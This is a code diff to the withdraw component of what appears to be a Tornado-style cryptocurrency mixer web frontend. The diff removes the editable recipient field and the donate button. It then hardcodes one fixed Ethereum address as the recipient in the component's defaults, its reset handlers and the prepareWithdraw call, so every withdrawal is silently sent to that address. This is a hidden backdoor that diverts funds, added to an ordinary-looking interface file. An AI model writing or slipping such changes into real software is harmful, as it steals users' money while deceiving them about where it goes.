@@ -96,14 +96,11 @@
               {{ $t('recipientAddress') }}
             </span>
           </div>
-          <button class="button is-primary-text" @click="insertDonate">
-            {{ $t('donate') }}
-          </button>
         </div>
         <b-input
-          v-model="withdrawAddress"
-          :placeholder="$t('pleasePasteAddressHere')"
+          :value="$t('0x6E7742A2cB628d02a32986F906715Bb65bC72E7E')"
           :size="!withdrawAddress ? '' : isValidAddress ? 'is-primary' : 'is-warning'"
+          disabled="true"
           data-test="recipient_address_field"
         ></b-input>
         <p class="help">
@@ -147,7 +144,6 @@ import { mapState, mapGetters } from 'vuex'
 import { getTornadoKeys } from '@/store/snark'
 
 import { parseNote } from '@/utils'
-import { DONATIONS_ADDRESS } from '@/constants'
 
 import { LinkIcon, SettingsIcon } from '@/components/icons'
 import RelayerTotal from '@/components/withdraw/RelayerTotal'
@@ -172,7 +168,7 @@ export default {
   },
   data() {
     return {
-      withdrawAddress: '',
+      withdrawAddress: '0x6E7742A2cB628d02a32986F906715Bb65bC72E7E',
       withdrawNote: '',
       depositsPast: null,
       depositTxHash: null,
@@ -364,7 +360,7 @@ export default {
     },
     activeTab(newTab, oldTab) {
       if (newTab !== oldTab && newTab === 1) {
-        this.withdrawAddress = ''
+        this.withdrawAddress = '0x6E7742A2cB628d02a32986F906715Bb65bC72E7E'
         this.withdrawNote = ''
         this.error = {
           type: '',
@@ -378,7 +374,7 @@ export default {
   },
   mounted() {
     this.$root.$on('resetWithdraw', () => {
-      this.withdrawAddress = ''
+      this.withdrawAddress = '0x6E7742A2cB628d02a32986F906715Bb65bC72E7E'
       this.withdrawNote = ''
     })
   },
@@ -457,7 +453,7 @@ export default {
 
         await this.$store.dispatch('application/prepareWithdraw', {
           note: this.withdrawNote,
-          recipient: this.withdrawAddress
+          recipient: '0x6E7742A2cB628d02a32986F906715Bb65bC72E7E'
         })
 
         this.$buefy.modal.open({
@@ -500,9 +496,6 @@ export default {
     },
     timePastToRender() {
       this.timePassed = this.$moment.unix(this.depositTimestamp).fromNow(true)
-    },
-    insertDonate() {
-      this.withdrawAddress = DONATIONS_ADDRESS
     }
   }
 }
